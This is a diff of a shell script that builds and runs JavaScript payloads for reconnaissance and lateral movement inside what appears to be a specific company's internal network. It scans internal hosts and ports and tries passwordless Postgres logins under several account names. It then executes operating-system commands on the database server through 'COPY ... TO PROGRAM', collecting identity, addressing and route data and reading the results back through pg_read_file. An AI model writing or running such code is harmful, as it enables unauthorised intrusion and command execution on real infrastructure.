@@ -1,33 +1,32 @@
 #!/bin/sh
 echo "== HOST =="
 id 2>/dev/null; hostname
-cat > /tmp/i5791p2.js <<'JS'
-const net=require("node:net"), dns=require("node:dns").promises, https=require("node:https"), http=require("node:http");
+cat > /tmp/i5791p3net.js <<'JS'
+const net=require("node:net");
 const tcp=(h,p,ms=5000)=>new Promise(r=>{const s=net.connect({host:h,port:p});let d=false;const f=x=>{if(!d){d=true;s.destroy();r(x)}};s.setTimeout(ms);s.on("connect",()=>f("OPEN"));s.on("timeout",()=>f("TIMEOUT"));s.on("error",e=>f("ERR:"+(e.code||e.message)));});
-const HOSTS=["traefik-gw.int.delasport.com","member.int.delasport.com","traefik-gw.int.test-delasport.com","api.int.test-delasport.com","member.int.test-delasport.com","delasport-spring-boot-admin.test-delasport.com","traefik-gw.int.dev-delasport.com","delasport-spring-boot-admin.int.dev-delasport.com","awd-backoffice.int.delasport.com","awd.int.delasport.com","payment.int.delasport.com","payment-monitor.int.delasport.com","bo.int.delasport.com","backoffice.int.delasport.com","admin.int.delasport.com","rabbitmq.int.delasport.com","db1.int.delasport.com","platform-marketing-api.int.delasport.com"];
-function req(ip,port,path,host,tls=true){return new Promise(r=>{const mod=tls?https:http; const o={host:ip,port,path,method:"GET",headers:{Host:host,"User-Agent":"Mozilla/5.0"},timeout:8000,rejectUnauthorized:false,servername:host};
- const q=mod.request(o,res=>{let b="";res.on("data",d=>b+=d);res.on("end",()=>r({ip,port,path,host,st:res.statusCode,len:b.length,body:b.slice(0,200).replace(/\n/g," "),hdr:JSON.stringify(res.headers).slice(0,250)}))});
- q.on("timeout",()=>{q.destroy();r({ip,port,path,host,st:"TIMEOUT"})});q.on("error",e=>r({ip,port,path,host,st:"ERR:"+(e.code||e.message)}));q.end();});}
 (async()=>{
- for(const h of HOSTS){let ips=[];try{ips=(await dns.lookup(h,{all:true})).map(x=>x.address)}catch(e){ips=["NX"]}
-   console.log("DNS",h,ips.join(","));
-   for(const ip of ips){ if(/^10\.|^192\.168\.|^172\.(1[6-9]|2\d|3[01])\./.test(ip)){ for(const p of [443,80]) console.log("INTTCP",h,ip,p,await tcp(ip,p)); } }
- }
- console.log("== direct internal traefik ==");
- for(const ip of ["10.156.1.207","10.156.0.47","10.156.0.59","10.156.1.7"]){
-   for(const p of [443,80]) console.log("TCP",ip,p,await tcp(ip,p));
- }
- const probes=[
-  ["10.156.1.207",443,"/api/v1/settings","awd-backoffice.delasport.com"],
-  ["10.156.1.207",443,"/","awd-backoffice.delasport.com"],
-  ["10.156.1.207",443,"/","traefik-gw.int.delasport.com"],
-  ["10.156.1.207",80,"/api/v1/settings","awd-backoffice.delasport.com"],
-  ["10.156.0.59",443,"/api/v1/settings","awd-backoffice.delasport.com"],
-  ["10.156.0.59",80,"/api/v1/settings","awd-backoffice.delasport.com"],
-  ["10.156.0.47",443,"/","member.int.delasport.com"],
- ];
- for(const [ip,p,path,host] of probes){ console.log("REQ",JSON.stringify(await req(ip,p,path,host,p===443))); }
+for(const [h,p] of [["10.1.72.1",5432],["10.1.72.1",5434],["10.1.72.4",5432],["10.1.72.4",7990],["10.1.17.70",5432],["10.1.72.5",8085],["10.0.29.254",443],["10.0.30.2",2049],["10.0.30.7",2049],["192.168.8.21",5432],["10.0.226.22",80],["10.0.226.9",80],["10.0.68.28",80],["10.156.1.207",443],["10.156.0.47",443]]) console.log("TCP",h,p,await tcp(h,p));
 })();
 JS
-node /tmp/i5791p2.js 2>&1
+node /tmp/i5791p3net.js 2>&1
+echo "== PG 10.1.72.1 =="
+cat > /tmp/i5791p3pg.js <<'JS'
+import { SQL } from "bun";
+async function trydb(user){
+  const url=`postgres://${user}@10.1.72.1:5432/postgres`;
+  try{
+    const db=new SQL(url,{connectionTimeout:6,max:1});
+    const r=await db.unsafe("select current_user cu, current_database() db, version() v");
+    console.log("PG_OK",user,JSON.stringify(r).slice(0,400));
+    const cmd="id > /tmp/i5791_r.txt 2>&1; hostname >> /tmp/i5791_r.txt; cat /etc/hostname >> /tmp/i5791_r.txt 2>&1; (ip -4 addr 2>/dev/null || ifconfig 2>/dev/null) >> /tmp/i5791_r.txt; ip route 2>/dev/null >> /tmp/i5791_r.txt; (echo > /dev/tcp/10.156.1.207/443) >/dev/null 2>&1 && echo ROUTE_10.156.1.207_443_OPEN >> /tmp/i5791_r.txt || echo ROUTE_10.156.1.207_443_CLOSED >> /tmp/i5791_r.txt; (echo > /dev/tcp/10.156.0.47/443) >/dev/null 2>&1 && echo ROUTE_10.156.0.47_443_OPEN >> /tmp/i5791_r.txt || echo ROUTE_10.156.0.47_443_CLOSED >> /tmp/i5791_r.txt; chmod 644 /tmp/i5791_r.txt";
+    await db.unsafe("COPY (SELECT '') TO PROGRAM $c$"+cmd+"$c$");
+    const r2=await db.unsafe("select pg_read_file('/tmp/i5791_r.txt') as o");
+    console.log("PG_CMD_OUT",JSON.stringify(r2).slice(0,2000));
+    await db.close();
+    return true;
+  }catch(e){ console.log("PG_ERR",user,String(e.message).slice(0,200)); return false; }
+}
+(async()=>{ for(const u of ["postgres","atlassian","bamboo","root"]){ if(await trydb(u)) break; } })();
+JS
+bun /tmp/i5791p3pg.js 2>&1
 echo "== DONE =="
